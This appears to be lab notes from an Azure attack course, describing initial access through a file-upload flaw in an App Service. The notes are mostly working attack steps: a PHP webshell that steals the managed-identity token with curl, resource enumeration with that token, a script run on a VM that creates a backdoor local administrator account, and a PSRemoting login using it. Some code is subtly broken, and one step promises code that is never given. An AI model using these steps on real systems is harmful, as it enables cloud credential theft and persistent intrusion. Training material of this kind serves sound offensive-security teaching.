# Part I 
## Initial Access via Compromised App Service Abuse with File Upload 


If you exploited an Azure App Service with file upload or RCE when you executed as `env` command on the app you can find variables to detect that the app server runs via managed identity. The variables are listed below;
  - `IDENTITY_HEADER`
  - `IDENTITY_ENDPOINT`

<!---objective 10 -->
1. If the app service uses a Managed Identity, we may have the ability to have interesting permissions on other Azure resources.
2. After compromising an app service, we can request access tokens for the managed identity.
3. If the app service contains environment variables `IDENTITY_HEADER` and `IDENTITY_ENDPOINT`, it has a managed identity.

    ```

4. Get the access token for the managed identity using another webshell. Upload `studentxtoken.PHTML`
    ```php
    <?php 
    system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
    ?>
    ```
    After upload `studentxtoken.PHTML` go to the URL as `https://defcorphqcareer.azurewebsites.net/uploads/studentxtoken.phtml` for get app svc token.

5. Check the resources available to the managed identity (using the access token and client ID)
    ```powershell
    Connect-AzAccount -AccessToken $token -AccountId $account_id
    Get-AzResource
    ```
    We can use the access token and client ID from above with Az PowerShell. But Az PowerShell needs tokens for both the azure resource manager (arn) and aad graph. With only the arm token, we will get the below error after running Get-AzRoleAssignment

6. Check the permissions of the managed identity on the virtual machine from above
  ![test](/img/app_server_abuse_3.png "Initial Access via App Service Abuse")

    ```powershell
    $URI = 'https://management.azure.com/subscriptions?apiversion=2020-01-01'
    $RequestParams = @{
      Method = 'GET'
      Uri = $URI
      Headers = @{
        'Authorization' = 'Bearer $token'
      }
    }

    #After successfully execution please execute the command down below 
    (Invoke-RestMethod @RequestParams).value
    ```
  ![test](/img/app_server_abuse_4.png "Initial Access via App Service Abuse")
  execute the command below;
  
  ```powershell
  $URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resources?api-version=2020-10-01'
  $RequestParams = @{
    Method = 'GET'
    Uri = $URI
    Headers = @{
      'Authorization' = 'Bearer $token'
    }
  }

  #After successfully execution please execute the command down below 
  (Invoke-RestMethod @RequestParams).value
  ```
    
  Let's see what actions are allowed using the below code:

# Part_II
## Initial Access - Execute Command On VMs
***Part of - Kill Chain - 1***   
   
   
![test](/img/app_server_abuse_1.png "Initial Access via App Service Abuse")

1. Upload `studentxtoken.phtml` file 
  ```php
  <?php 
  system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
  ?>
  ```
2. Go to the uploaded URL `http://defcorphqcareer.azurewebsites.net/uploads/student31token.phtml`
  ![test](/img/access.png "Initial Access via App Service Abuse")
3. Check the resources available to the managed identity (using the access token and client ID)
    ```powershell
    Connect-AzAccount -AccessToken $token -AccountId $account_id
    Get-AzResource
    ```
    We can use the access token and client ID from above with Az PowerShell. 
    ![test](/img/access_2.png "Initial Access via App Service Abuse")
4. Enumerate the VM that we can access PublicIP address via below commmand;
    ```powershell
    Get-AzPublicIpAddress -Name bkpadconnectIP
    ```
    ![test](/img/access_3.png "Initial Access via App Service Abuse")
5. Once we have access rights on the Azure VMs that means we can execute a command remotly via `Invoke-AzVMRunCommand`
    ```powershell
    Invoke-AzVMRunCommand -VMName bkpadconnect -ResourceGroupName Engineering -CommandId 'RunPowerShellScript' -ScriptPath 'C:\AzAD\Tools\adduser.ps1' -Verbose
    ```

    The script of `adduser.ps1` is down below;

    ```powershell
    $passwd = ConvertTo-SecureString "Stud31Password@123" -AsPlainText -Force
    
    New-LocalUser -Name student31 -Password $passwd 
    Add-LocalGroupMember -Group Administrators -Member student31
    ```
    Once executed this script the output is shown below;
    
    ![test](/img/access_4.png "Initial Access via App Service Abuse")
6. Now we can access the VMs via `PSRemoting`;
    ```powershell
    $Password = ConvertTo-SecureString "Stud31Password@123" -AsPlainText -Force
    $creds = New-Object System.Management.Automation.PSCredential('student31',$Password)
    $sess = New-PSSession -ComputerName 20.52.148.232 -Credential $creds -SessionOption (New-PSSessionOption) -ProxyAccessType NoProxyServer)
    Enter-PSSession $sess
    ```
